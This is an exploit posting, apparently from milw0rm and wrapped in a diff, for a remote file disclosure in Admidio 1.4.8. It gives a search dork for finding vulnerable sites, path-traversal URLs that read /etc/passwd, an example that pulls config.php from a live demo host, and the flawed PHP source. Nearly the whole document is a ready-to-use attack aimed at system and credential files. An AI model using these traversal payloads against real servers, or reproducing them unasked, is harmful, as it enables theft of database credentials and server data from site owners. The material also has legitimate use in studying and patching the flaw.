@@ -1,0 +1,40 @@
+/---------------------------------------------------------------\
++                                				+
++        	Admidio 1.4.8 Remote File Disclosure            +
++                                				+
+\---------------------------------------------------------------/
+
+
+[*] Author    : n3v3rh00d, http://forum.antichat.ru
+
+[*] Download    : http://prdownloads.sourceforge.net/admidio/admidio-1.4.8.zip
+
+[*] Bug Type    : Remote File Disclosure
+
+[*] Dork    : "Admidio Team"
+
+[*] POC        : /adm_program/modules/download/get_file.php?folder=&file=../../../../../../../../../../etc/passwd&default_folder=
+
+[*] Example    : http://demo.admidio.org/adm_program/modules/download/get_file.php?folder=&file=../../adm_config/config.php&default_folder=
+
+[*] Source    :
+    ..........................................................
+
+    $file   = strStripTags(urldecode($_GET['file']));
+    $act_folder     = "../../../adm_my_files/download";
+
+    ..........................................................
+
+    $file_name   = "$act_folder/$file";
+    $file_length = filesize("$act_folder/$file");
+    
+    ..........................................................
+    
+    header("Content-Type: application/octet-stream");
+    header("Content-Length: $file_length");
+    header("Content-Disposition: attachment; filename=\"$file\"");
+
+    header('Cache-Control: private');
+    readfile($file_name);
+
+# milw0rm.com [2008-05-09]
